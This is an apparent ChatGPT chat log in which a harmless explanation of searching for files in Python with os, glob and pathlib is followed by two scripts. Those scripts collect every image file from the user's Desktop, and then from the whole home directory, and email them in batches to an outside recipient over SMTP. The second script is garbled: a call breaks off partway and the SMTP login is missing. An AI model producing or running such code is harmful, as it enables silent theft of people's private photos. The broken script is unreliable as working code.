Is it possible to search for files with Python

ChatGPT
Yes, it is possible to search for files with Python. You can use several libraries to achieve this, such as os, glob, or pathlib. Here are a few examples:

Using os module
The os module provides a way of interacting with the operating system and can be used to search for files:

python
Kodu kopyala
import os

def search_files(directory, file_extension):
    files = []
    for root, dirs, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith(file_extension):
                files.append(os.path.join(root, filename))
    return files

# Example usage:
directory_path = "/path/to/directory"
extension = ".txt"
found_files = search_files(directory_path, extension)
print(found_files)
Using glob module
The glob module finds all the pathnames matching a specified pattern according to the rules used by the Unix shell.

python
Kodu kopyala
import glob

def search_files(directory, file_pattern):
    search_pattern = os.path.join(directory, file_pattern)
    return glob.glob(search_pattern, recursive=True)

# Example usage:
directory_path = "/path/to/directory"
pattern = "*.txt"
found_files = search_files(directory_path, pattern)
print(found_files)
Using pathlib module
The pathlib module offers an object-oriented approach to handling filesystem paths.

python
Kodu kopyala
from pathlib import Path

def search_files(directory, file_extension):
    path = Path(directory)
    return list(path.rglob(f"*{file_extension}"))

# Example usage:
directory_path = "/path/to/directory"
extension = ".txt"
found_files = search_files(directory_path, extension)
print(found_files)
These examples demonstrate different methods to search for files within a directory. You can choose the one that best fits your requirements.

import os
import smtplib
import mimetypes
from email.message import EmailMessage
from email.utils import make_msgid

# Function to search for image files on Windows Desktop
def search_image_files_on_windows_desktop():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp')
    image_files = []
    for root, dirs, filenames in os.walk(desktop_path):
        for filename in filenames:
            if filename.lower().endswith(image_extensions):
                image_files.append(os.path.join(root, filename))
    return image_files

# Email configuration
EMAIL_ADDRESS = "your_email@example.com"  # Replace with your email address
EMAIL_PASSWORD = "your_password"  # Replace with your email password
RECIPIENT_EMAIL = "recipient_email@example.com"  # Replace with recipient's email address
SMTP_SERVER = "smtp.example.com"  # Replace with your SMTP server address
SMTP_PORT = 587  # Replace with your SMTP server port (usually 587 for TLS or 465 for SSL)

# Function to send email with images attached
def send_email_with_images(image_files):
    msg = EmailMessage()
    msg['Subject'] = 'Images from Desktop'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg.set_content("Attached are the images found on the desktop.")

    for image_file in image_files:
        ctype, encoding = mimetypes.guess_type(image_file)
        maintype, subtype = ctype.split('/', 1)
        
        with open(image_file, 'rb') as img:
            msg.add_attachment(img.read(),
                               maintype=maintype,
                               subtype=subtype,
                               filename=os.path.basename(image_file),
                               cid=make_msgid())

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# Main function
if __name__ == "__main__":
    images = search_image_files_on_windows_desktop()
    send_email_with_images(images)
    print("Email sent successfully.")

import smtplib
import mimetypes
from email.message import EmailMessage
from email.utils import make_msgid

# Function to search for image files on the entire computer
def search_image_files():
    root_directory = os.path.expanduser("~")  # Start from the user's home directory
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp')
    image_files = []
    for root, dirs, filenames in os.walk(root_directory):
        for filename in filenames:
            if filename.lower().endswith(image_extensions):
                image_files.append(os.path.join(root, filename))
    return image_files

# Email configuration
EMAIL_ADDRESS = "your_email@example.com"  # Replace with your email address
EMAIL_PASSWORD = "your_password"  # Replace with your email password
RECIPIENT_EMAIL = "recipient_email@example.com"  # Replace with recipient's email address
SMTP_SERVER = "smtp.example.com"  # Replace with your SMTP server address
SMTP_PORT = 587  # Replace with your SMTP server port (usually 587 for TLS or 465 for SSL)

# Function to send email with images attached
def send_email_with_images(image_files, batch_number):
    msg = EmailMessage()
    msg['Subject'] = f'Images Batch {batch_number} from Computer'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECIPIENT_EMAIL
    msg.set_content(f"Attached are the images found on the computer. Batch {batch_number}")

    for image_file in image_files:
        ctype, encoding = mimetypes.guess_type(image_file)
        maintype, subtype = ctype.split('/', 1)
        
        with open(image_file, 'rb') as img:
            msg.add_attachment(img.read(),
                               maintype=maintype,
                               subtype=subtype,
                               filename=os.path.basename(image_file),

        server.starttls()

        server.send_message(msg)

# Main function
if __name__ == "__main__":
    images = search_image_files()
    batch_size = 5
    for i in range(0, len(images), batch_size):
        batch = images[i:i + batch_size]
        send_email_with_images(batch, i // batch_size + 1)
    print("Emails sent successfully.")
